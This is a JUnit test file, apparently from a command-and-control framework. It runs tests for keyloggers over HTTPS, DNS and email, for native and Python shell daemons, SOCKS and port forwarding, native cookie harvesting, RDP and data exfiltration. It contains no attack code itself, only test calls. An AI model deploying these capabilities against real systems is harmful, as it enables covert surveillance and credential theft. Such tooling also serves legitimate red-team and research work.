package c2;

import static org.junit.jupiter.api.Assertions.fail;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import c2.nativeshell.RunnerTestNativeLinuxDaemon;
import c2.nativeshell.RunnerTestNativeWindowsDaemon;
import c2.portforward.PythonPortForwardTest;
import c2.portforward.socks.PythonSocks5Test;
import c2.python.RunnerTestKeyloggerDNS;
import c2.python.RunnerTestKeyloggerEmail;
import c2.python.RunnerTestKeyloggerHTTPS;
import c2.python.RunnerTestPython;
import c2.python.RunnerTestPythonEmail;
import c2.rdp.RunnerTestPythonHTTPSDaemonWinRDP;
import c2.smtp.EmailHandlerTester;
import c2.win.RunnerTestDaemonHarvestCookiesNative;
import c2.filereceiver.*;

class MasterLinearTest {

	@BeforeEach
	void setUp() throws Exception {
	}

	@AfterEach
	void tearDown() throws Exception {
	}

	@Test
	void test() {
		//Daemon tests
		//Protocol verification tests
		EmailHandlerTester.test();
		
		//Test Keyloggers
		RunnerTestKeyloggerHTTPS.test();
		RunnerTestKeyloggerDNS.test();
		RunnerTestKeyloggerEmail.test();
		
		//Testing Linux
		System.out.println("Testing Linux Native Shell");
		RunnerTestNativeLinuxDaemon.test();
		
		//Native daemon tests
		System.out.println("Testing Windows Native");
		RunnerTestNativeWindowsDaemon.test();
		
		//Python
		System.out.println("Testing Python");
		RunnerTestPython.testHTTPS();
		RunnerTestPython.testDNS();
		RunnerTestPythonEmail.testEmail();
		
		System.out.println("Testing Python multiple sessions");
		RunnerTestPython.testHTTPSTwoSessions();
		RunnerTestPython.testDNSTwoSessions();

		//Test Socks
		PythonSocks5Test.testAll();
		
		//Port forward
		PythonPortForwardTest.testHTTPS();
		PythonPortForwardTest.testDNS();
		PythonPortForwardTest.testEmail();
		
		//Macro command execution tests
		try {
			RunnerTestDaemonHarvestCookiesNative.testAll();
		} catch (Exception e) {
			e.printStackTrace();
			fail(e.getMessage());
		}
		
		RunnerTestPythonHTTPSDaemonWinRDP.test();
		
		//Testing daemon exfil
		RunnerTestPythonHarvest.cleanup();
		RunnerTestPythonHarvest.testPythonDataExfil();
		RunnerTestPythonHarvest.cleanup();
	}

}
